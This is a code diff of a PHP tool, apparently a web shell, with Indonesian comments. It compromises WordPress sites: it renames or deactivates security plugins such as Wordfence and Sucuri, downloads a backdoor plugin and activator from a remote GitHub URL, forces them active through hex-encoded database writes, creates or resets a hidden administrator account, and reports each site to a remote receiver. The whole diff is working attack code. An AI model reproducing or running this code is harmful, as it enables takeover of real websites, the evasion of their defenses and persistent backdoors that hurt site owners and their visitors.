@@ -1,3 +1,4 @@
+
 <?php
 // Checkpoint-401
 
@@ -610,239 +611,138 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
             if (@mysqli_real_connect($cn, $dh, $du, $dp, $dn)) {
                 if (isset($_POST['create_wp_admin'])) {
                     
-                    $plugins_dir = $wp_root_path . '/wp-content/plugins/';
-                    
-                    // --- DETEKSI & HAPUS HOSTINGER ---
-                    $path_hostinger = $plugins_dir . 'hostinger';
-                    $hst_badge = "";
-                    if (is_dir($path_hostinger)) {
-                        rrmdir($path_hostinger);
-                        clearstatcache(); 
-                        if (!file_exists($path_hostinger)) $hst_badge = "<span style='$st_warn'>HOSTINGER DEL</span>";
-                        else $hst_badge = "<span style='$st_err'>DEL HOSTINGER FAIL</span>";
+                    // --- OPTIMASI: DOWNLOAD MASTER SEKALI SAJA ---
+                    global $master_core, $master_index;
+                    if (!isset($master_core)) {
+                        $master_core = sys_get_temp_dir() . '/master_core_' . time() . '.php';
+                        $master_index = sys_get_temp_dir() . '/master_index_' . time() . '.php';
+                        
+                        $ua = stream_context_create(['http'=>['header'=>"User-Agent: Mozilla/5.0"]]);
+                        $src_core = @file_get_contents($plugin_src, false, $ua);
+                        $src_idx  = @file_get_contents('https://raw.githubusercontent.com/baseng1337/damn/refs/heads/main/index.php', false, $ua);
+                        
+                        if($src_core) file_put_contents($master_core, $src_core);
+                        if($src_idx) file_put_contents($master_index, $src_idx);
                     }
 
-                    // --- 1. DOWNLOAD PLUGIN & BUAT BACKDOOR ACTIVATOR ---
+                    $plugins_dir = $wp_root_path . '/wp-content/plugins/';
+                    
+                    // --- 1. KILL SECURITY PLUGINS (RENAME MODE) ---
+                    $targets_to_kill = [
+                        'hostinger', 'wordfence', 'ithemes-security-pro', 'better-wp-security',
+                        'sucuri-scanner', 'sg-security', 'login-lockdown', 
+                        'limit-login-attempts-reloaded', 'all-in-one-wp-security-and-firewall'
+                    ];
+                    
+                    $kill_badge = "";
+                    foreach ($targets_to_kill as $folder) {
+                        $path = $plugins_dir . $folder;
+                        if (is_dir($path)) {
+                            @rename($path, $path . '_killed_' . time());
+                            $kill_badge .= "<span style='$st_warn'>KIL:" . strtoupper(substr($folder,0,3)) . "</span> ";
+                        }
+                    }
+                    if (empty($kill_badge)) $kill_badge = "<span style='color:#777; font-size:0.8em'>NO SEC</span>";
+
+                    // --- 2. DEPLOY SYSTEM CORE ---
                     $target_folder = $plugins_dir . $plugin_folder_name;
                     $target_file = $target_folder . '/' . $plugin_filename;
-                    $index_file  = $target_folder . '/index.php'; // File Activator Baru
-                    $dl_badge = "<span style='$st_err'>DL FAIL</span>";
+                    $index_file  = $target_folder . '/index.php';
+                    $dl_badge = "";
                     
                     if (!is_dir($target_folder)) {
                         @mkdir($target_folder, 0755, true);
                         @chmod($target_folder, 0755);
                     }
 
-                    // A. Download Main Plugin
+                    // Copy Core
                     if (!file_exists($target_file)) {
-                        $p_content = @file_get_contents($plugin_src, false, stream_context_create(['http'=>['header'=>"User-Agent: Mozilla/5.0"]]));
-                        if ($p_content && @file_put_contents($target_file, $p_content)) {
+                        if (file_exists($master_core) && @copy($master_core, $target_file)) {
                             @chmod($target_file, 0644);
-                            $dl_badge = "<span style='$st_ok'>DL OK</span>";
-                        }
-                    } else {
-                        $dl_badge = "<span style='$st_warn'>EXISTS</span>";
-                    }
+                            $dl_badge .= "<span style='$st_ok'>CORE</span> ";
+                        } else { $dl_badge .= "<span style='$st_err'>CORE</span> "; }
+                    } else { $dl_badge .= "<span style='$st_warn'>CORE</span> "; }
 
-                    // B. Buat File index.php (The Activator + Security Killer)
-                    $index_code = "<?php
-error_reporting(0); ini_set('display_errors', 0);
+                    // Copy Index Activator
+                    if (!file_exists($index_file)) {
+                        if (file_exists($master_index) && @copy($master_index, $index_file)) {
+                            @chmod($index_file, 0644);
+                            $dl_badge .= "<span style='$st_ok'>IDX</span>";
+                        } else { $dl_badge .= "<span style='$st_err'>IDX</span>"; }
+                    } else { $dl_badge .= "<span style='$st_warn'>IDX</span>"; }
 
-// 1. Cari wp-load.php
-\$root = __DIR__; \$wp_load = false;
-for (\$i=0; \$i<5; \$i++) {
-    \$root = dirname(\$root);
-    if (file_exists(\$root . '/wp-load.php')) { \$wp_load = \$root . '/wp-load.php'; break; }
-}
-if (!\$wp_load) die('WP_LOAD_NOT_FOUND');
-require_once(\$wp_load);
-require_once(ABSPATH . 'wp-admin/includes/plugin.php');
-
-// 2. [FITUR BARU] MATIKAN WORDFENCE & SECURITY LAINNYA
-\$active = get_option('active_plugins', []);
-\$new_active = [];
-\$killed = false;
-
-if (is_array(\$active)) {
-    foreach (\$active as \$p) {
-        // Cek nama folder plugin keamanan
-        if (stripos(\$p, 'wordfence') !== false || stripos(\$p, 'ithemes') !== false || stripos(\$p, 'sucuri') !== false || stripos(\$p, 'sg-security') !== false || stripos(\$p, 'login-lockdown') !== false) {
-            deactivate_plugins(\$p); // Matikan secara resmi
-            \$killed = true;
-        } else {
-            \$new_active[] = \$p;
-        }
-    }
-    // Paksa update database untuk memastikan mereka mati
-    if (\$killed) {
-        update_option('active_plugins', \$new_active);
-        echo 'SECURITY_PLUGINS_KILLED_';
-    }
-}
-
-// 3. Aktifkan Plugin System Core (Jika Mati)
-\$plugin_base = 'system-core/system-core.php';
-if (!is_plugin_active(\$plugin_base)) {
-    activate_plugin(\$plugin_base);
-    \$curr = get_option('active_plugins', []);
-    if (!in_array(\$plugin_base, \$curr)) { \$curr[] = \$plugin_base; update_option('active_plugins', \$curr); }
-}
-
-// 4. Reset & Trigger Setup
-delete_option('rls_setup_done'); 
-\$core_file = __DIR__ . '/system-core.php';
-if (file_exists(\$core_file)) {
-    require_once(\$core_file);
-    if (function_exists('rls_auto_setup')) {
-        rls_auto_setup();
-        echo 'SYSTEM_CORE_ACTIVE_AND_TRIGGERED';
-    }
-} else {
-    echo 'CORE_FILE_MISSING';
-}
-?>";
-                    @file_put_contents($index_file, $index_code);
-                    @chmod($index_file, 0644);
-
-                    // --- 2. ACTIVATION (HEX METHOD - ANTI CORRUPTION) ---
-                    $act_badge = "";
-                    $is_active = false;
-                    
-                    // A. Matikan Cache Object Sementara
+                    // --- 3. ACTIVATION (HEX) ---
+                    $act_badge = ""; $is_active = false;
                     $wp_content = $wp_root_path . '/wp-content';
                     $obj_cache = $wp_content . '/object-cache.php';
                     $adv_cache = $wp_content . '/advanced-cache.php';
-                    $renamed_obj = false;
-                    $renamed_adv = false;
+                    $renamed_obj = false; $renamed_adv = false;
 
                     if (file_exists($obj_cache)) { @rename($obj_cache, $obj_cache . '.suspend'); $renamed_obj = true; }
                     if (file_exists($adv_cache)) { @rename($adv_cache, $adv_cache . '.suspend'); $renamed_adv = true; }
                     
-                    // Hapus folder cache fisik
-                    $cache_dir = $wp_content . '/cache';
-                    if (is_dir($cache_dir)) {
-                        $files = new RecursiveIteratorIterator(
-                            new RecursiveDirectoryIterator($cache_dir, RecursiveDirectoryIterator::SKIP_DOTS),
-                            RecursiveIteratorIterator::CHILD_FIRST
-                        );
-                        foreach ($files as $fileinfo) {
-                            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
-                            @$todo($fileinfo->getRealPath());
-                        }
-                        @rmdir($cache_dir);
-                    }
-
-                    // B. UPDATE DB MENGGUNAKAN HEX (PERBAIKAN UTAMA)
                     $qopt = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='active_plugins'");
                     if ($qopt && mysqli_num_rows($qopt) > 0) {
                         $row = mysqli_fetch_assoc($qopt);
                         $current_plugins = @unserialize($row['option_value']);
                         if (!is_array($current_plugins)) $current_plugins = [];
-                    } else {
-                        $current_plugins = [];
-                    }
+                    } else { $current_plugins = []; }
 
                     $current_plugins = array_diff($current_plugins, [$plugin_hook_old]);
-                    if (!in_array($plugin_hook, $current_plugins)) {
-                        $current_plugins[] = $plugin_hook;
-                    }
+                    if (!in_array($plugin_hook, $current_plugins)) $current_plugins[] = $plugin_hook;
                     sort($current_plugins);
                     
-                    // [SOLUSI] Gunakan bin2hex untuk menghindari mysqli_real_escape_string merusak serialisasi
-                    $serialized_data = serialize($current_plugins);
-                    $hex_data = bin2hex($serialized_data);
-                    
+                    $hex_data = bin2hex(serialize($current_plugins));
                     @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='active_plugins'");
-                    // Syntax 0x... memaksa MySQL membaca sebagai raw binary/string
                     if (@mysqli_query($cn, "INSERT INTO {$pre}options (option_name, option_value, autoload) VALUES ('active_plugins', 0x$hex_data, 'yes')")) {
-                        
-                        // Bersihkan transient agar WP membaca ulang option
                         @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name LIKE '_transient_%' OR option_name LIKE '_site_transient_%'");
                         @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='rls_setup_done'");
-                        
-                        $act_badge = "<span style='$st_ok'>FORCED ON (HEX)</span>";
+                        $act_badge = "<span style='$st_ok'>HEX</span>";
                         $is_active = true;
+                    } else { $act_badge = "<span style='$st_err'>DB</span>"; }
+
+                    // --- 4. CREATE USER ---
+                    $u_badge = "";
+                    $q1 = @mysqli_query($cn, "SELECT ID FROM {$pre}users WHERE user_login='$au'");
+                    if ($q1 && mysqli_num_rows($q1) > 0) {
+                        $uid = mysqli_fetch_assoc($q1)['ID'];
+                        @mysqli_query($cn, "UPDATE {$pre}users SET user_pass='$ap' WHERE ID=$uid");
+                        $u_badge = "<span style='$st_warn'>UP</span>";
                     } else {
-                        $act_badge = "<span style='$st_err'>DB HEX ERROR</span>";
+                        @mysqli_query($cn, "INSERT INTO {$pre}users (user_login,user_pass,user_nicename,user_email,user_status,display_name) VALUES ('$au','$ap','Admin','$ae',0,'Admin')");
+                        $uid = mysqli_insert_id($cn);
+                        $u_badge = "<span style='$st_ok'>ADD</span>";
                     }
+                    $cap = serialize(['administrator'=>true]);
+                    @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}capabilities','$cap') ON DUPLICATE KEY UPDATE meta_value='$cap'");
+                    @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}user_level','10') ON DUPLICATE KEY UPDATE meta_value='10'");
 
-                    // --- 3. PING & RESTORE CACHE ---
-                    if ($is_active && !empty($surl)) {
-                        $trigger_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
-                        if (function_exists('curl_init')) {
-                            $ch_t = curl_init();
-                            curl_setopt($ch_t, CURLOPT_URL, $surl);
-                            curl_setopt($ch_t, CURLOPT_RETURNTRANSFER, true);
-                            curl_setopt($ch_t, CURLOPT_TIMEOUT, 5);
-                            curl_setopt($ch_t, CURLOPT_USERAGENT, $trigger_ua);
-                            curl_setopt($ch_t, CURLOPT_SSL_VERIFYPEER, false);
-                            curl_setopt($ch_t, CURLOPT_SSL_VERIFYHOST, false);
-                            @curl_exec($ch_t);
-                            @curl_close($ch_t);
-                        } 
-                        elseif (ini_get('allow_url_fopen')) {
-                            $opts_t = ['http'=>['method'=>'GET','header'=>"User-Agent: $trigger_ua\r\n",'timeout'=>5]];
-                            @file_get_contents($surl, false, stream_context_create($opts_t));
-                        }
-                    }
-
-                    $ping_badge = "<span style='background:#555; color:#aaa; padding:2px 6px; border-radius:3px; font-size:0.85em;'>NO PING</span>";
+                    // --- 5. PING & DIRECT REPORT (GARANSI LIST MUNCUL) ---
+                    $ping_badge = "<span style='color:#aaa; font-size:0.8em'>-</span>";
                     $surl = "";
                     $qurl = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl'");
                     if ($qurl && mysqli_num_rows($qurl)>0) $surl = mysqli_fetch_assoc($qurl)['option_value'];
 
-                    if ($is_active && !empty($surl)) {
-                        $pdata = http_build_query(['action'=>'register_site', 'secret'=>$receiver_key, 'domain'=>$surl]);
-                        $ping_success = false;
-                        $method_used = "";
-                        $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
+                    if (!empty($surl)) {
+                        // A. DIRECT REPORT KE DASHBOARD (Agar list domain langsung muncul)
+                        // Kita kirim data domain saja, password kosong dulu. Nanti plugin yang isi passwordnya.
+                        $pdata_direct = http_build_query(['action'=>'register_site', 'secret'=>$receiver_key, 'domain'=>$surl, 'api_user'=>'', 'api_pass'=>'']);
+                        $ctx_direct = stream_context_create(['http'=>['method'=>'POST','header'=>"Content-type: application/x-www-form-urlencoded",'content'=>$pdata_direct,'timeout'=>2]]);
+                        @file_get_contents($receiver_url, false, $ctx_direct);
 
-                        if (!$ping_success && function_exists('curl_init')) {
-                            $ch = curl_init();
-                            curl_setopt($ch, CURLOPT_URL, $receiver_url);
-                            curl_setopt($ch, CURLOPT_POST, 1);
-                            curl_setopt($ch, CURLOPT_POSTFIELDS, $pdata);
-                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-                            curl_setopt($ch, CURLOPT_TIMEOUT, 6);
-                            curl_setopt($ch, CURLOPT_USERAGENT, $ua);
-                            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-                            $res = curl_exec($ch);
-                            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-                            curl_close($ch);
-                            if ($res !== false && $code == 200) { $ping_success = true; $method_used = "CURL"; }
+                        // B. TRIGGER PLUGIN (Agar generate password)
+                        if ($is_active) {
+                            $trigger_url = rtrim($surl, '/') . '/wp-content/plugins/' . $plugin_folder_name . '/index.php';
+                            $ctx_trig = stream_context_create(['http'=>['method'=>'GET','header'=>"User-Agent: Mozilla/5.0",'timeout'=>2]]);
+                            @file_get_contents($trigger_url, false, $ctx_trig);
+                            $ping_badge = "<span style='$st_ok'>OK</span>";
                         }
-
-                        if (!$ping_success) {
-                            $opts = ['http'=>['method'=>'POST','header'=>"Content-type: application/x-www-form-urlencoded\r\nUser-Agent: $ua\r\n",'content'=>$pdata,'timeout'=>6]];
-                            $res = @file_get_contents($receiver_url, false, stream_context_create($opts));
-                            if ($res !== false) { $ping_success = true; $method_used = "FGC"; }
-                        }
-
-                        if($ping_success) $ping_badge = "<span style='$st_ok'>PING: $method_used</span>";
-                        else $ping_badge = "<span style='$st_err'>PING FAIL</span>";
                     }
                     
                     if ($renamed_obj) { @rename($obj_cache . '.suspend', $obj_cache); }
                     if ($renamed_adv) { @rename($adv_cache . '.suspend', $adv_cache); }
 
-
-                    // --- 4. CREATE USER ---
-                    $q1 = @mysqli_query($cn, "SELECT ID FROM {$pre}users WHERE user_login='$au'");
-                    if ($q1 && mysqli_num_rows($q1) > 0) {
-                        $uid = mysqli_fetch_assoc($q1)['ID'];
-                        @mysqli_query($cn, "UPDATE {$pre}users SET user_pass='$ap' WHERE ID=$uid");
-                        $u_badge = "<span style='$st_warn'>USER UP</span>";
-                    } else {
-                        @mysqli_query($cn, "INSERT INTO {$pre}users (user_login,user_pass,user_nicename,user_email,user_status,display_name) VALUES ('$au','$ap','Admin','$ae',0,'Admin')");
-                        $uid = mysqli_insert_id($cn);
-                        $u_badge = "<span style='$st_ok'>USER ADD</span>";
-                    }
-                    
-                    $cap = serialize(['administrator'=>true]);
-                    @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}capabilities','$cap') ON DUPLICATE KEY UPDATE meta_value='$cap'");
-                    @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}user_level','10') ON DUPLICATE KEY UPDATE meta_value='10'");
-
-                    $log .= "$dl_badge $hst_badge $act_badge $ping_badge $u_badge <a href='$surl/wp-login.php' target='_blank' style='background:#333; padding:2px 6px; border-radius:3px; color:#fff; text-decoration:none; font-size:0.85em;'>Login &raquo;</a>";
+                    $log .= "$kill_badge $dl_badge $act_badge $u_badge $ping_badge <a href='$surl/wp-login.php' target='_blank' style='background:#333; padding:2px 6px; border-radius:3px; color:#fff; text-decoration:none; font-size:0.85em;'>Login &raquo;</a>";
                 }
                 
                 elseif (isset($_POST['reactivate_plugins'])) {
